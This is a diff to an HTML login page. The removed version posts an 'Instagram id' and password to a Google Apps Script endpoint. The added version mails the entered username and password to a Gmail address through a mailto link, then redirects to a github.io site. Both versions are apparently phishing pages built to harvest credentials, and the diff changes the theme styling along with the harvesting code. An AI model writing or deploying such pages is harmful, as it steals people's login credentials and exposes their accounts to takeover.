@@ -3,11 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>eus.thacs Login Page</title>
+<title>Login Page</title>
 <style>
     body {
         font-family: Arial, sans-serif;
-        background-color: #121212;
+        background-color: #111;
+        color: #eee;
         margin: 0;
         padding: 0;
         display: flex;
@@ -27,7 +28,7 @@
 
     .login-container h2 {
         margin-bottom: 30px;
-        color: #fff;
+        color: #eee;
     }
 
     .login-container input[type="text"],
@@ -39,7 +40,7 @@
         border-radius: 5px;
         box-sizing: border-box;
         background-color: #444;
-        color: #fff;
+        color: #eee;
     }
 
     .login-container input[type="submit"] {
@@ -56,27 +57,32 @@
         background-color: #45a049;
     }
 </style>
-    
 </head>
 <body>
 
 <div class="login-container">
     <h2>Login</h2>
-    <form id="gform" method"POST" action="https://script.google.com/macros/s/AKfycbz7SgN6LhE-XpaS3MZkW-e6ucGWX32OM4jQ168hUS6gKDRj2YdvnV-QI-KP3fky3YFXcg/exec">
-        <input type="text" name="username" id="username" placeholder="Instagram id" required><br>
-        <input type="password" name="password" id="password" placeholder="Password" required><br>
+    <form id="login-form">
+        <input type="text" name="username" placeholder="Username" required><br>
+        <input type="password" name="password" placeholder="Password" required><br>
         <input type="submit" value="Login">
     </form>
 </div>
 
 <script>
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-         {
-            window.location.href = 'https://nishanahdassociates.github.io/eus.thacs/';
-        } 
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        var username = this.elements['username'].value;
+        var password = this.elements['password'].value;
+
+        // Simulate sending email
+        var emailContent = "Username: " + username + "\nPassword: " + password;
+        window.location.href = "mailto:your.email@gmail.com?subject=Login Information&body=" + encodeURIComponent(emailContent);
+
+        // Redirect to URL after login
+        setTimeout(function() {
+            window.location.href = "https://nishanahdassociates.github.io/eus.thacs/";
+        }, 1000); // Change the delay time as needed
     });
 </script>
 
